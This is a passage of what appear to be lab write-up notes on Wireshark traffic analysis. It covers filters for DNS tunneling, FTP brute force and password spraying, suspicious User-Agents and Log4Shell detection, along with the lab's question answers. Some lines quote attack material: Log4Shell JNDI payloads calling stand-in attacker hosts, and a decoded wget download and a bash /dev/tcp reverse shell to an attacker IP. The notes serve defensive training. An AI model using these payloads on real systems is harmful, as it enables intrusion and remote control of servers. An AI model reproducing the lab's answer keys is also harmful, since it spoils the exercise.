dataexfil.com
```


Defanged:


```plain text
dataexfil[.]com
```


**Answer:** `dataexfil[.]com`


---


# Quick Summary


| Filter                              | Purpose                                                   |
| ----------------------------------- | --------------------------------------------------------- |
| `icmp`                              | Show all ICMP packets                                     |
| `data.len > 64 and icmp`            | Detect unusually large ICMP payloads (possible tunneling) |
| `icmp and frame matches "ssh        | http                                                      |
| `dns`                               | Show all DNS traffic                                      |
| `dns.flags.response == 0`           | Show only DNS queries                                     |
| `dns.qry.name.len > 30 and !mdns`   | Find unusually long DNS queries                           |
| `dns contains "dnscat"`             | Detect known dnscat tunneling                             |
| `dns.qry.type == 16`                | Show TXT record queries                                   |
| `dns.qry.name contains "dataexfil"` | Find traffic to a suspicious domain                       |


# Cleartext Protocol Analysis


## What are Cleartext Protocols?


A **cleartext protocol** sends data over the network **without encryption**.


This means anyone capturing the network traffic can read the transmitted information.


Examples:

- FTP
- HTTP
- Telnet

Because the data is not encrypted, attackers can steal:

- Usernames
- Passwords
- Files
- Commands

---


# FTP (File Transfer Protocol)


## What is FTP?


FTP is used to transfer files between a client and a server.


Example:


```plain text
Client
    │
Connects to FTP Server
    │
Logs in using Username & Password
    │
Uploads or Downloads files
```


Unlike SFTP or FTPS, **FTP does not encrypt its communication**.


Everything—including usernames and passwords—is sent in plain text.


---


## Risks of Using FTP


Because FTP is unencrypted, attackers can perform:

- Man-in-the-Middle (MITM) attacks
- Credential theft
- Unauthorized access
- Malware upload/download
- Data exfiltration

---


# Useful FTP Filters


## Show All FTP Traffic


```plain text
ftp
```


### Understanding the Filter


| Part  | Meaning                                                                                              |
| ----- | ---------------------------------------------------------------------------------------------------- |
| `ftp` | Displays every FTP packet, including login requests, server responses, commands, and file transfers. |


### Why use it?


Use this as the **starting point** for any FTP investigation.


After applying it, you can see:

- Login attempts
- Server responses
- File operations
- Commands sent by users

---


# FTP Response Codes


FTP servers reply with **3-digit status codes**.


The first digit tells you the type of response.


| Series | Meaning                                  |
| ------ | ---------------------------------------- |
| 1xx    | Information                              |
| 2xx    | Success                                  |
| 3xx    | Authentication / More information needed |
| 4xx    | Temporary failure                        |
| 5xx    | Permanent failure                        |


---


## System Status (211)


```plain text
ftp.response.code == 211
```


### Understanding the Filter


| Part                | Meaning                                   |
| ------------------- | ----------------------------------------- |
| `ftp.response.code` | FTP status code sent by the server.       |
| `211`               | Server returns system status information. |


### Why use it?


Shows packets where the server reports its current status.


---


## Passive Mode


```plain text
ftp.response.code == 227
```


### Understanding the Filter


| Part                | Meaning                      |
| ------------------- | ---------------------------- |
| `ftp.response.code` | FTP server response code.    |
| `227`               | Server entered Passive Mode. |


### Why use it?


FTP uses **Passive Mode** when the client requests the server to open a data port for file transfer.


Seeing many `227` responses often indicates:

- File uploads
- File downloads

---


## Successful Login


```plain text
ftp.response.code == 230
```


### Understanding the Filter


| Part                | Meaning                   |
| ------------------- | ------------------------- |
| `ftp.response.code` | FTP server response code. |
| `230`               | Login successful.         |


### Why use it?


Shows every successful authentication.


Useful for identifying:

- Which accounts successfully logged in
- When the login occurred

---


# FTP Commands


Every action a user performs is sent as an FTP command.


---


## Find Usernames


```plain text
ftp.request.command == "USER"
```


### Understanding the Filter


| Part                  | Meaning                         |
| --------------------- | ------------------------------- |
| `ftp.request.command` | FTP command sent by the client. |
| `"USER"`              | Username command.               |


### What will you see?


Example packet:


```plain text
USER john
```


This reveals the username:


```plain text
john
```


---


## Find Passwords


```plain text
ftp.request.command == "PASS"
```


### Understanding the Filter


| Part                  | Meaning                         |
| --------------------- | ------------------------------- |
| `ftp.request.command` | FTP command sent by the client. |
| `"PASS"`              | Password command.               |


### What will you see?


Example:


```plain text
PASS MyPassword123
```


Because FTP is unencrypted, the password is visible in plain text.


---


## Find a Specific Password


```plain text
ftp.request.arg == "password"
```


### Understanding the Filter


| Part              | Meaning                             |
| ----------------- | ----------------------------------- |
| `ftp.request.arg` | Argument (value) of an FTP command. |
| `"password"`      | Search for this specific password.  |


### Why use it?


Suppose you know the attacker repeatedly used:


```plain text
Summer2025!
```


You can search for it directly:


```plain text
ftp.request.arg == "Summer2025!"
```


to find every login attempt using that password.


---


# Detect Brute Force Attacks


A brute-force attack repeatedly tries many passwords until one works.


Example:


```plain text
USER admin
PASS 123456

USER admin
PASS password

USER admin
PASS admin123

USER admin
PASS qwerty
```


---


## Show Failed Logins


```plain text
ftp.response.code == 530
```


### Understanding the Filter


| Part                | Meaning                                               |
| ------------------- | ----------------------------------------------------- |
| `ftp.response.code` | FTP server response.                                  |
| `530`               | Login failed (invalid password or unauthorized user). |


### Why use it?


A large number of `530` responses often indicates a brute-force attack.


Example:


```plain text
530 Login incorrect

530 Login incorrect

530 Login incorrect

530 Login incorrect
```


Many failures in a short time are suspicious.


---


## Failed Logins for a Specific User


```plain text
(ftp.response.code == 530) and (ftp.response.arg contains "username")
```


### Understanding the Filter


| Part                                   | Meaning                                          |
| -------------------------------------- | ------------------------------------------------ |
| `ftp.response.code == 530`             | Show failed logins.                              |
| `and`                                  | Both conditions must be true.                    |
| `ftp.response.arg contains "username"` | Search only failures for the specified username. |


### Example


```plain text
530 User john cannot log in

530 User john cannot log in

530 User john cannot log in
```


This suggests someone is repeatedly attacking the **john** account.


---


# Detect Password Spraying


A password spraying attack tries **one password against many different accounts**.


Example:


```plain text
USER john
PASS Welcome123

USER alice
PASS Welcome123

USER david
PASS Welcome123

USER peter
PASS Welcome123
```


Notice:

- Password stays the same.
- Username changes.

---


## Detect Password Spraying


```plain text
(ftp.request.command == "PASS") and (ftp.request.arg == "password")
```


### Understanding the Filter


| Part                            | Meaning                                    |
| ------------------------------- | ------------------------------------------ |
| `ftp.request.command == "PASS"` | Show password commands only.               |
| `ftp.request.arg == "password"` | Find packets using the specified password. |


### Why use it?


If the same password appears for many different usernames, it may indicate a password spraying attack.


---


# Quick Summary


| Filter                                                                  | Purpose                                            |
| ----------------------------------------------------------------------- | -------------------------------------------------- |
| `ftp`                                                                   | Show all FTP traffic                               |
| `ftp.response.code == 211`                                              | Show server status messages                        |
| `ftp.response.code == 227`                                              | Show Passive Mode responses (often file transfers) |
| `ftp.response.code == 230`                                              | Show successful logins                             |
| `ftp.response.code == 530`                                              | Show failed login attempts                         |
| `ftp.request.command == "USER"`                                         | Display usernames                                  |
| `ftp.request.command == "PASS"`                                         | Display passwords                                  |
| `ftp.request.arg == "password"`                                         | Find a specific password                           |
| `(ftp.response.code == 530) and (ftp.response.arg contains "username")` | Find failed logins for a specific user             |
| `(ftp.request.command == "PASS") and (ftp.request.arg == "password")`   | Detect password spraying                           |


## Question 1: Failed Login Attempts


**Question:** How many incorrect login attempts are there?


**Answer:** `737`


### Method 1 (Direct Filter)


```plain text
ftp.response.code == 530
```


### Understanding the Filter


| Part                | Meaning                                                     |
| ------------------- | ----------------------------------------------------------- |
| `ftp.response.code` | FTP response code returned by the server.                   |
| `530`               | Login failed (invalid username/password or not authorized). |


### Why it works


Every failed login attempt generates a **530** response from the FTP server.


Example:


```plain text
USER admin
PASS 123456

↓

530 Login incorrect
```


If an attacker tries 737 incorrect passwords, the server generates **737 packets with response code 530**.


### How to Find the Answer

1. Open **ftp.pcap**.
2. Apply:

```plain text
ftp.response.code == 530
```

1. Look at the bottom-right corner of Wireshark.

```plain text
Displayed: 737
```


This is the total number of failed login attempts.


---


### Method 2 (Broader Authentication Failures)


```plain text
ftp.response.code in {430 530}
```


### Understanding the Filter


| Part                | Meaning                                             |
| ------------------- | --------------------------------------------------- |
| `ftp.response.code` | FTP response code.                                  |
| `in {430 530}`      | Show packets with response code **430** or **530**. |


### Why it works


Different FTP servers may use different response codes.

- **430** → Invalid username or password.
- **530** → Login failed / Not logged in.

Using both codes ensures you don't miss failed authentication attempts on different FTP server implementations.


---


## Question 2: File Size Accessed


**Question:** What is the size of the file accessed by the **ftp** account?


**Answer:** `39424`


### Method 1 (Direct Filter)


```plain text
ftp.response.code == 213
```


### Understanding the Filter


| Part                | Meaning                                             |
| ------------------- | --------------------------------------------------- |
| `ftp.response.code` | FTP server response code.                           |
| `213`               | File Status response. Often contains the file size. |


### Why it works


When a client requests file information, the FTP server replies with a **213 File Status** message.


Example:


```plain text
213 39424
```


The number **39424** is the file size in bytes.


### Alternative Method

1. Find a successful login.

```plain text
ftp.response.code == 230
```

1. Right-click the packet.

```plain text
Follow → TCP Stream
```

1. Read the FTP conversation to locate the file size.

---


## Question 3: Uploaded Filename


**Question:** The adversary uploaded a document to the FTP server. What is the filename?


**Answer:** `resume.doc`


### Filter


```plain text
ftp.request.command == "STOR"
```


### Understanding the Filter


| Part                  | Meaning                         |
| --------------------- | ------------------------------- |
| `ftp.request.command` | FTP command sent by the client. |
| `STOR`                | Upload a file to the server.    |


### Why it works


FTP uses different commands for upload and download:

- `RETR` → Download a file.
- `STOR` → Upload a file.

Since the question says the attacker **uploaded** a file, the correct command is **STOR**.


Example:


```plain text
STOR resume.doc
```


The argument after `STOR` is the uploaded filename.

> **Note:** If the question asked which file was **downloaded**, use:

```plain text
ftp.request.command == "RETR"
```


---


## Question 4: Permission Change Command


**Question:** The adversary tried to assign special permissions to the uploaded file. What command was used?


**Answer:**


```plain text
CHMOD 777
```


### Filter


```plain text
ftp contains "CHMOD"
```


### Understanding the Filter


| Part       | Meaning                                    |
| ---------- | ------------------------------------------ |
| `ftp`      | Search FTP packets only.                   |
| `contains` | Search for a text string.                  |
| `"CHMOD"`  | Find packets containing the CHMOD command. |


### Why it works


The attacker changes file permissions after uploading the file.


Example:


```plain text
SITE CHMOD 777 resume.doc
```


Meaning:

- `SITE` → Execute a server-specific command.
- `CHMOD` → Change file permissions.
- `777` → Give read, write, and execute permissions to everyone.

After applying the filter, you'll find the packet containing:


```plain text
SITE CHMOD 777 resume.doc
```


which reveals the command used by the attacker.


# HTTP Analysis


## What is HTTP?


**HTTP (Hypertext Transfer Protocol)** is a **client-server** protocol used to transfer web pages and web resources over a network.


Whenever you open a website, your browser sends an **HTTP Request**, and the web server sends back an **HTTP Response**.


Example:


```plain text
Browser (Client)
      │
GET /index.html
      │
      ▼
Web Server
      │
200 OK + Web Page
      ▼
Browser
```


Unlike HTTPS, **HTTP does not encrypt data**, meaning anyone capturing the traffic can read:

- URLs
- Usernames
- Passwords
- Cookies
- Files
- Commands

Because HTTP is widely used and usually allowed through firewalls, attackers often abuse it.


---


# Why is HTTP Important for Security Analysis?


HTTP analysis helps detect:

- Phishing websites
- Web application attacks
- Malware downloads
- Data exfiltration
- Command & Control (C2)
- Vulnerability scanning

---


# HTTP vs HTTP/2


| HTTP                            | HTTP/2                                               |
| ------------------------------- | ---------------------------------------------------- |
| Plain text protocol             | Binary protocol                                      |
| One request per connection      | Multiple requests over one connection (Multiplexing) |
| Slower                          | Faster                                               |
| Easy to read in packet captures | Harder to inspect manually                           |


---


# HTTP Request and Response


Every HTTP communication has two parts.


## HTTP Request


Sent by the client.


Example:


```plain text
GET /login HTTP/1.1
Host: example.com
User-Agent: Chrome
```


The client is asking for a resource.


---


## HTTP Response


Sent by the server.


Example:


```plain text
HTTP/1.1 200 OK
Content-Type: text/html
```


The server replies with the requested resource or an error.


---


# Useful HTTP Filters


## Show All HTTP Traffic


```plain text
http
```


### Understanding the Filter


| Part   | Meaning                     |
| ------ | --------------------------- |
| `http` | Displays every HTTP packet. |


### Why use it?


This is always the **first filter** when investigating web traffic.


After applying it, you can inspect:

- Requests
- Responses
- URLs
- Headers
- Cookies
- User-Agents

---


## Show HTTP/2 Traffic


```plain text
http2
```


### Understanding the Filter


| Part    | Meaning                       |
| ------- | ----------------------------- |
| `http2` | Displays only HTTP/2 packets. |


### Why use it?


Useful when modern web applications communicate using HTTP/2 instead of HTTP.


---


# HTTP Request Methods


A request method tells the server **what action the client wants to perform.**


---


## GET Requests


```plain text
http.request.method == "GET"
```


### Understanding the Filter


| Part                  | Meaning                                   |
| --------------------- | ----------------------------------------- |
| `http.request.method` | HTTP request method.                      |
| `"GET"`               | Request to retrieve data from the server. |


### Why use it?


GET requests usually:

- Open webpages
- Download images
- Read files
- Access APIs

Example:


```plain text
GET /login.html
```


The browser is requesting:


```plain text
login.html
```


---


## POST Requests


```plain text
http.request.method == "POST"
```


### Understanding the Filter


| Part                  | Meaning                   |
| --------------------- | ------------------------- |
| `http.request.method` | HTTP request method.      |
| `"POST"`              | Sends data to the server. |


### Why use it?


POST requests usually contain:

- Login credentials
- Form submissions
- File uploads
- API requests

Example:


```plain text
POST /login
username=admin
password=admin123
```


Because POST carries user data, attackers often use it during:

- Login attempts
- Malware uploads
- Data exfiltration
- Exploit delivery

---


## Show All HTTP Requests


```plain text
http.request
```


### Understanding the Filter


| Part           | Meaning                                           |
| -------------- | ------------------------------------------------- |
| `http.request` | Displays every HTTP request regardless of method. |


### Why use it?


Useful when you want to inspect every request sent by a client without filtering only GET or POST.


---


# HTTP Response Codes


After receiving a request, the server replies with a status code.


---


## Successful Requests


```plain text
http.response.code == 200
```


### Understanding the Filter


| Part                 | Meaning                                  |
| -------------------- | ---------------------------------------- |
| `http.response.code` | HTTP status code returned by the server. |
| `200`                | Request completed successfully.          |


### Why use it?


Shows successfully accessed resources.


Example:


```plain text
GET /index.html

↓

200 OK
```


---


## Unauthorized


```plain text
http.response.code == 401
```


### Understanding the Filter


| Part  | Meaning                  |
| ----- | ------------------------ |
| `401` | Authentication required. |


Example:


```plain text
/login
↓

401 Unauthorized
```


Usually indicates the user must log in.


---


## Forbidden


```plain text
http.response.code == 403
```


### Understanding the Filter


| Part  | Meaning        |
| ----- | -------------- |
| `403` | Access denied. |


Example:


```plain text
/admin

↓

403 Forbidden
```


The resource exists, but access is blocked.


---


## Not Found


```plain text
http.response.code == 404
```


### Understanding the Filter


| Part  | Meaning                       |
| ----- | ----------------------------- |
| `404` | Requested resource not found. |


### Why is it useful?


Large numbers of 404 responses may indicate:

- Directory brute-forcing
- Vulnerability scanners
- Broken links

Example:


```plain text
/admin1
↓

404

/admin2
↓

404

/admin3
↓

404
```


---


## Method Not Allowed


```plain text
http.response.code == 405
```


### Understanding the Filter


| Part  | Meaning                                   |
| ----- | ----------------------------------------- |
| `405` | The requested HTTP method is not allowed. |


Example:


```plain text
POST /index.html

↓

405
```


Sometimes indicates an attacker is trying unsupported methods.


---


## Service Unavailable


```plain text
http.response.code == 503
```


### Understanding the Filter


| Part  | Meaning                         |
| ----- | ------------------------------- |
| `503` | Server temporarily unavailable. |


Common reasons:

- Maintenance
- Server overload
- DoS attack

---


# HTTP Header Filters


HTTP headers contain valuable information about the client and server.


---


## Find a Specific User-Agent


```plain text
http.user_agent contains "nmap"
```


### Understanding the Filter


| Part              | Meaning                                             |
| ----------------- | --------------------------------------------------- |
| `http.user_agent` | Browser or application identity sent by the client. |
| `contains "nmap"` | Search for the word **nmap**.                       |


### Why use it?


Scanning tools often identify themselves.


Example:


```plain text
User-Agent: Nmap Scripting Engine
```


This strongly suggests reconnaissance activity.


---


## Find Requests to an Admin Page


```plain text
http.request.uri contains "admin"
```


### Understanding the Filter


| Part               | Meaning                                 |
| ------------------ | --------------------------------------- |
| `http.request.uri` | Requested path only.                    |
| `contains "admin"` | Search for requests containing "admin". |


Example:


```plain text
/admin
/admin/login
/admin.php
```


Useful when hunting for admin page access.


---


## Find a Specific Full URL


```plain text
http.request.full_uri contains "admin"
```


### Understanding the Filter


| Part                    | Meaning                                       |
| ----------------------- | --------------------------------------------- |
| `http.request.full_uri` | Complete URL including protocol and hostname. |
| `contains "admin"`      | Search for "admin" anywhere in the full URL.  |


Example:


```plain text
<http://example.com/admin/login.php>
```


---


## Find Apache Servers


```plain text
http.server contains "apache"
```


### Understanding the Filter


| Part                | Meaning                                        |
| ------------------- | ---------------------------------------------- |
| `http.server`       | Server software reported in the HTTP response. |
| `contains "apache"` | Search for Apache web servers.                 |


Example:


```plain text
Server: Apache/2.4.57
```


Useful during server fingerprinting.


---


## Find Requests to a Host


```plain text
http.host contains "keyword"
```


or


```plain text
http.host == "keyword"
```


### Understanding the Filter


| Part        | Meaning                           |
| ----------- | --------------------------------- |
| `http.host` | Hostname requested by the client. |
| `contains`  | Partial match.                    |
| `==`        | Exact match.                      |


Example:


```plain text
Host: google.com
```


---


## Find Persistent Connections


```plain text
http.connection == "Keep-Alive"
```


### Understanding the Filter


| Part              | Meaning                                              |
| ----------------- | ---------------------------------------------------- |
| `http.connection` | Connection behavior.                                 |
| `"Keep-Alive"`    | Reuse the same TCP connection for multiple requests. |


---


## Search HTTP Content


```plain text
data-text-lines contains "keyword"
```


### Understanding the Filter


| Part                 | Meaning                                         |
| -------------------- | ----------------------------------------------- |
| `data-text-lines`    | Searches readable text inside the HTTP payload. |
| `contains "keyword"` | Look for a specific word or string.             |


### Why use it?


Useful for finding:

- Credentials
- Commands
- Emails
- URLs
- Malware strings

Example:


```plain text
username=admin
password=secret123
```


Searching for:


```plain text
data-text-lines contains "password"
```


would locate packets containing that text.


---


# Quick Summary


| Filter                                   | Purpose                      |
| ---------------------------------------- | ---------------------------- |
| `http`                                   | Show all HTTP traffic        |
| `http2`                                  | Show HTTP/2 traffic          |
| `http.request`                           | Show all HTTP requests       |
| `http.request.method == "GET"`           | Show GET requests            |
| `http.request.method == "POST"`          | Show POST requests           |
| `http.response.code == 200`              | Successful responses         |
| `http.response.code == 401`              | Unauthorized responses       |
| `http.response.code == 403`              | Forbidden responses          |
| `http.response.code == 404`              | Missing resources            |
| `http.response.code == 405`              | Method not allowed           |
| `http.response.code == 503`              | Service unavailable          |
| `http.user_agent contains "nmap"`        | Detect Nmap user-agent       |
| `http.request.uri contains "admin"`      | Find requests to admin pages |
| `http.request.full_uri contains "admin"` | Search full URLs             |
| `http.server contains "apache"`          | Identify Apache servers      |
| `http.host contains "keyword"`           | Search hostnames             |
| `http.connection == "Keep-Alive"`        | Find persistent connections  |
| `data-text-lines contains "keyword"`     | Search HTTP payload text     |


# User-Agent Analysis


## What is a User-Agent?


A **User-Agent** is an HTTP header that identifies the application making the HTTP request.


It usually tells the web server:

- Browser name
- Browser version
- Operating System
- Device type

Example:


```plain text
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/137.0
```


This tells the server that the request came from a Chrome browser running on Windows.


---


# Why is User-Agent Important?


When attackers perform web attacks, they often change (spoof) the User-Agent to:

- Hide their real tools
- Look like a normal browser
- Bypass security rules
- Avoid detection

Examples:


Legitimate browser:


```plain text
Mozilla/5.0 Chrome/137.0
```


Scanner:


```plain text
Nmap Scripting Engine
```


Malicious script:


```plain text
python-requests
```


Because the User-Agent can be modified easily, **never trust it alone**. Always use it together with other evidence.


---


# What Should You Look For?


During an investigation, check for:

- Different User-Agents from the same host within a short time
- Non-standard User-Agents
- Typographical mistakes
- Security scanning tools
- Payloads hidden inside the User-Agent

---


# Useful Filters


## Show All User-Agents


```plain text
http.user_agent
```


### Understanding the Filter


| Part              | Meaning                                                 |
| ----------------- | ------------------------------------------------------- |
| `http.user_agent` | Displays packets containing the HTTP User-Agent header. |


### Why use it?


This is the starting point for User-Agent analysis.


After applying it, inspect:

- Browser names
- Operating systems
- Automated tools
- Suspicious custom strings

---


## Detect Common Scanning Tools


```plain text
(http.user_agent contains "sqlmap") or
(http.user_agent contains "Nmap") or
(http.user_agent contains "Nikto") or
(http.user_agent contains "Wfuzz")
```


### Understanding the Filter


| Part              | Meaning                                             |
| ----------------- | --------------------------------------------------- |
| `http.user_agent` | Searches the User-Agent field.                      |
| `contains`        | Looks for a specific word inside the User-Agent.    |
| `or`              | Display packets matching any one of the conditions. |


### Why does it work?


Many security tools identify themselves.


Examples:


```plain text
User-Agent: sqlmap

User-Agent: Nmap Scripting Engine

User-Agent: Nikto

User-Agent: Wfuzz
```


These tools are commonly used for:

- Vulnerability scanning
- SQL Injection testing
- Directory brute forcing
- Web reconnaissance

Finding these strings often indicates someone is scanning the web server.


---


# Detecting Spoofed User-Agents


Attackers often try to imitate browsers.


Legitimate:


```plain text
Mozilla/5.0
```


Spoofed:


```plain text
Mozlila/5.0
```


Notice:


```plain text
Mozilla
```


became


```plain text
Mozlila
```


A tiny spelling mistake can indicate a fake User-Agent.


---


## Find Misspelled User-Agents


```plain text
http.user_agent contains "Mozlila"
```


or


```plain text
http.user_agent matches "Mozlila"
```


### Understanding the Filter


| Part              | Meaning                                      |
| ----------------- | -------------------------------------------- |
| `http.user_agent` | Searches the User-Agent field.               |
| `contains`        | Finds packets containing the text.           |
| `matches`         | Uses pattern matching (regular expressions). |


### Why use it?


If you suspect someone copied a browser User-Agent incorrectly, search for the misspelled word.


Example:


Normal:


```plain text
Mozilla/5.0
```


Suspicious:


```plain text
Mozlila/5.0
```


That small typo may identify malicious traffic.


---


# Detect Suspicious Custom User-Agents


Sometimes attackers don't even pretend to be browsers.


Example:


```plain text
User-Agent: evil-bot

User-Agent: python-requests

User-Agent: curl

User-Agent: wget
```


These are not normal browser User-Agents.


They often indicate:

- Automation
- Malware
- Scripts
- Crawlers

---


# Investigation Methodology


Instead of manually checking thousands of packets:


Open


```plain text
Statistics
↓

HTTP

↓

User-Agent
```


(or **Tools → HTTP → User-Agents**, depending on the Wireshark version.)


Wireshark displays:

- Every unique User-Agent
- Number of packets using each User-Agent

This makes anomalies easy to spot.


---


# Practice Questions


## Question 1


**Investigate the User-Agents. How many anomalous User-Agent types are there?**


**Answer:** `6`


### Method 1 (Recommended)


Open:


```plain text
Statistics
↓

HTTP

↓

User-Agent
```


Review every unique User-Agent.


Ignore normal browsers.


Count suspicious entries such as:

- Nmap
- sqlmap
- Nikto
- Wfuzz
- Custom scripts
- Misspelled browsers

Total:


```plain text
6
```


---


### Method 2 (Display Filter)


```plain text
(http.user_agent contains "sqlmap") or
(http.user_agent contains "Nmap") or
(http.user_agent contains "Nikto") or
(http.user_agent contains "Wfuzz")
```


This quickly identifies several common offensive tools.


Remember:


This filter **does not detect every anomaly**.


You should still inspect all User-Agent values in the User-Agent statistics window.


---


## Question 2


**What is the packet number with the subtle spelling mistake?**


**Answer:** `52`


### Filter


```plain text
http.user_agent contains "Mozlila"
```


or


```plain text
http.user_agent matches "Mozlila"
```


### Understanding the Filter


| Part                 | Meaning                            |
| -------------------- | ---------------------------------- |
| `http.user_agent`    | Searches User-Agent values.        |
| `contains "Mozlila"` | Finds the misspelled browser name. |


### Why does it work?


Attackers copied


```plain text
Mozilla
```


but accidentally wrote


```plain text
Mozlila
```


After applying the filter,


only one packet remains.


The packet number shown in the first column is:


```plain text
52
```


---


# Analyst Tips


✔ Never trust the User-Agent alone.


Attackers can easily modify it.


Instead, combine User-Agent analysis with:

- Source IP
- Destination IP
- HTTP Methods
- Requested URLs
- Response Codes
- Request Frequency

The User-Agent should be treated as **supporting evidence**, not definitive proof of malicious activity.


---


# Quick Summary


| Filter                               | Purpose                                    |
| ------------------------------------ | ------------------------------------------ |
| `http.user_agent`                    | Show packets containing User-Agent headers |
| `http.user_agent contains "sqlmap"`  | Detect sqlmap traffic                      |
| `http.user_agent contains "Nmap"`    | Detect Nmap scans                          |
| `http.user_agent contains "Nikto"`   | Detect Nikto scans                         |
| `http.user_agent contains "Wfuzz"`   | Detect Wfuzz scans                         |
| `http.user_agent contains "Mozlila"` | Find misspelled Mozilla User-Agent         |
| `http.user_agent matches "Mozlila"`  | Regex search for the misspelled User-Agent |


# Log4Shell (Log4j) Analysis


## What is Log4Shell (Log4j)?


**Log4Shell** is a Remote Code Execution (RCE) vulnerability (CVE-2021-44228) found in the **Apache Log4j** logging library.


The vulnerability allows an attacker to execute malicious commands on a vulnerable server simply by sending a specially crafted HTTP request.


---


# How Does the Attack Work?


Normally:


```plain text
Client
   │
HTTP Request
   │
Server
   │
Logs the request
```


During a Log4Shell attack:


```plain text
Attacker
      │
HTTP Request
(User-Agent: ${jndi:ldap://attacker.com/a})
      │
      ▼
Vulnerable Server
      │
Log4j Processes the String
      │
Contacts Attacker's LDAP Server
      │
Downloads Malicious Code
      │
Executes the Code
```


The attacker doesn't directly send malware.


Instead, they trick the server into **downloading and executing it**.


---


# Understanding the Payload


Example payload:


```plain text
${jndi:ldap://attacker.com/a}
```


Let's break it down.


| Part           | Meaning                                                                      |
| -------------- | ---------------------------------------------------------------------------- |
| `${...}`       | Log4j expression that gets evaluated.                                        |
| `jndi`         | Java Naming and Directory Interface (used to locate external resources).     |
| `ldap`         | Lightweight Directory Access Protocol. The server contacts this LDAP server. |
| `attacker.com` | Attacker-controlled server.                                                  |
| `/a`           | Malicious resource to load.                                                  |


When Log4j evaluates this string,


it connects to:


```plain text
ldap://attacker.com/a
```


downloads malicious code,


and executes it.


---


# Why is HTTP Important?


Attackers usually send the payload inside HTTP headers because web servers automatically log them.


Common locations include:

- User-Agent
- Referer
- X-Forwarded-For
- URL Parameters

The vulnerable server logs these headers, triggering the exploit.


---


# Indicators of a Log4Shell Attack


Look for:

- HTTP POST requests
- `${jndi:...}` strings
- `ldap://`
- `rmi://`
- `dns://`
- `Exploit.class`
- Base64 encoded commands
- Suspicious User-Agent values

---


# Useful Filters


## Find POST Requests


```plain text
http.request.method == "POST"
```


### Understanding the Filter


| Part                  | Meaning                   |
| --------------------- | ------------------------- |
| `http.request.method` | HTTP request method.      |
| `"POST"`              | Shows POST requests only. |


### Why use it?


Many Log4Shell attacks begin with a POST request because POST requests can carry large payloads.

> **Note:** Not every POST request is malicious, but it is a good starting point.

---


## Search for "jndi"


```plain text
frame contains "jndi"
```


### Understanding the Filter


| Part       | Meaning                                       |
| ---------- | --------------------------------------------- |
| `frame`    | Search the entire packet (headers + payload). |
| `contains` | Look for a text string.                       |
| `"jndi"`   | Search for the Log4Shell keyword.             |


### Why use `frame` instead of `http`?


The payload could appear anywhere inside the packet:

- User-Agent
- URL
- Referer
- POST Body

Searching the **entire frame** ensures you don't miss it.


Example:


```plain text
User-Agent:
${jndi:ldap://evil.com/a}
```


or


```plain text
POST /login

username=admin
${jndi:ldap://evil.com/a}
```


---


## Search for Exploit.class


```plain text
frame contains "Exploit"
```


### Understanding the Filter


| Part        | Meaning                        |
| ----------- | ------------------------------ |
| `frame`     | Search the entire packet.      |
| `"Exploit"` | Search for the word "Exploit". |


### Why use it?


Many public Log4Shell proof-of-concept exploits download a Java class named:


```plain text
Exploit.class
```


Finding this string is a strong indicator of exploitation.


---


## Search Suspicious User-Agent


```plain text
(http.user_agent contains "$") or
(http.user_agent contains "==")
```


### Understanding the Filter


| Part              | Meaning                                    |
| ----------------- | ------------------------------------------ |
| `http.user_agent` | Search the User-Agent header.              |
| `contains "$"`    | Log4Shell payloads begin with `${...}`.    |
| `contains "=="`   | Base64 strings often end with `=` or `==`. |


### Why does this work?


A normal User-Agent looks like:


```plain text
Mozilla/5.0
```


A malicious one may look like:


```plain text
${jndi:ldap://evil.com/a}
```


or


```plain text
Basic/Command/Base64/d2dldCAxMjM==
```


The `$` suggests a Log4j payload.


The `==` often indicates Base64-encoded data.


---


# Practice Questions


## Question 1


**Locate the Log4Shell attack starting phase. What is the packet number?**


**Answer:** `444`


---


### Method 1 (Recommended)


```plain text
frame contains "jndi"
```


### Why does it work?


Every Log4Shell exploit contains:


```plain text
${jndi:...}
```


Searching for **jndi** immediately reveals the exploit packets.


---


### Alternative Method


```plain text
frame contains "Exploit"
```


Some exploit payloads download:


```plain text
Exploit.class
```


Searching for **Exploit** may also locate the attack.


---


### How to Find the Answer

1. Apply:

```plain text
frame contains "jndi"
```

1. The first matching packet is:

```plain text
Packet 444
```


This is where the exploit begins.


---


## Question 2


**Locate the Log4Shell attack and decode the Base64 command. What IP address does the attacker contact?**


**Answer:**


```plain text
62[.]210[.]130[.]250
```


---


### Step 1


Open:


```plain text
Packet 444
```


or apply:


```plain text
frame.number == 444
```


---


### Understanding the Filter


| Part           | Meaning                                 |
| -------------- | --------------------------------------- |
| `frame.number` | Select a specific packet by its number. |
| `444`          | Opens the first Log4Shell packet.       |


---


### Step 2


Expand:


```plain text
Hypertext Transfer Protocol
```


Locate the User-Agent.


You may see:


```plain text
${jndi:ldap://x.x.x.x/Basic/Command/Base64/SGVsbG8...}
```


Notice the long Base64 string after:


```plain text
Base64/
```


Copy it.


---


### Step 3


Decode the Base64 string.


Use:

- CyberChef
- Linux

```bash
echo "<base64_string>" | base64 -d
```


---


### Step 4


The decoded command contains:


```plain text
wget <http://62.210.130.250/>...
```


or


```plain text
bash -i >& /dev/tcp/62.210.130.250/...
```


The attacker-controlled server is:


```plain text
62.210.130.250
```


Defanged:


```plain text
62[.]210[.]130[.]250
```


---


# Investigation Workflow


When investigating a suspected Log4Shell attack:


### Step 1


Look for POST requests.


```plain text
http.request.method == "POST"
```


↓


### Step 2


Search for JNDI payloads.


```plain text
frame contains "jndi"
```


↓


### Step 3


Inspect the matching packet.


↓


### Step 4


Locate the malicious payload.


↓


### Step 5


Extract any Base64 string.


↓


### Step 6


Decode it.


↓


### Step 7


Identify:

- Attacker IP
- Download URL
- Executed command
- Malware location

---


# Quick Summary


| Filter                                                              | Purpose                               |
| ------------------------------------------------------------------- | ------------------------------------- |
| `http.request.method == "POST"`                                     | Show POST requests                    |
| `frame contains "jndi"`                                             | Detect Log4Shell payloads             |
| `frame contains "Exploit"`                                          | Search for exploit class references   |
| `(http.user_agent contains "$") or (http.user_agent contains "==")` | Detect suspicious User-Agent payloads |
| `frame.number == 444`                                               | Jump directly to the attack packet    |


# HTTPS (TLS) Traffic Analysis


## What is HTTPS?


**HTTPS (Hypertext Transfer Protocol Secure)** is the secure version of HTTP.


Unlike HTTP, HTTPS **encrypts** all communication between the client and the server using the **TLS (Transport Layer Security)** protocol.


Example:


```plain text
Browser
     │
Encrypted HTTP Request (HTTPS)
     │
     ▼
Web Server
```


Because the traffic is encrypted, anyone capturing the packets **cannot read**:

- URLs
- Usernames
- Passwords
- Cookies
